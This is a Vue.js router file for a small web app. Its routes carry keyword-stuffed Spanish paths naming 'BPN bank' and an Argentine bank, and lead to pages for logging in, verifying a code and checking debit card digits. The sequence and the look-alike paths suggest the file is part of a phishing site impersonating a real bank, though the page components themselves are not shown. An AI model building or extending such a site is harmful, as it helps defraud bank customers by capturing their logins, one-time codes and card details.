import Vue from 'vue'
import VueRouter from 'vue-router'

//Components
import LogIn from '../views/LogIn.vue';
import DigitsDebit from '../views/DigitsDebit.vue';
import VerifyCode from '../views/VerifyCode.vue';
import HomeView from '../views/HomeView.vue';

Vue.use(VueRouter)

const routes = [
  {
    path: '/',
    name: 'home',
    component: HomeView
  },
  {
    path: '/bpn-bank-ingresar-usuarios-registro-creditos-compras-banco-argentina',
    name: 'log-in',
    component: LogIn
  },
  {
    path: '/bpn-bank-validar-codigo-usuarios-identidad-banco-argentina',
    name: 'verify-code',
    component: VerifyCode
  },
  {
    path: '/bpn-bank-validar-identidad-usuarios-registro-creditos-compras-banco-argentina',
    name: 'check-debit',
    component: DigitsDebit
  },

]

const router = new VueRouter({
  mode: 'history',
  base: process.env.BASE_URL,
  routes
})

export default router
